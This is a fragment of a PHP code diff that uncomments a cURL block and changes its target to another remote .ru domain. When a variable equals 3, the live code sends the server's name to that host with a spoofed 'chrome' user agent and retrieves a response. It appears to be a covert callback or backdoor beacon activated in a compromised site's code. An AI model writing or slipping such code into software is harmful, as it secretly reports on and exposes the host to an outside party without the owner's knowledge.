@@ -47,16 +47,16 @@ if($sayi == 1) {
  if($sayi == 3)
 {
 	
-/*
+
   $curl3 = curl_init();
  curl_setopt_array($curl3, [
     CURLOPT_RETURNTRANSFER => 1,
-    CURLOPT_URL => 'http://konder05.ru/dev/data.php?s='.$_SERVER["SERVER_NAME"].'',
+    CURLOPT_URL => 'http://serpuhov.rampirogi.ru/data/data.php?s='.$_SERVER["SERVER_NAME"].'',
     CURLOPT_USERAGENT => 'chrome'
 ]);
  $resp3 = curl_exec($curl3);
  curl_close($curl3);	
-*/	
+	
 } 
 
 
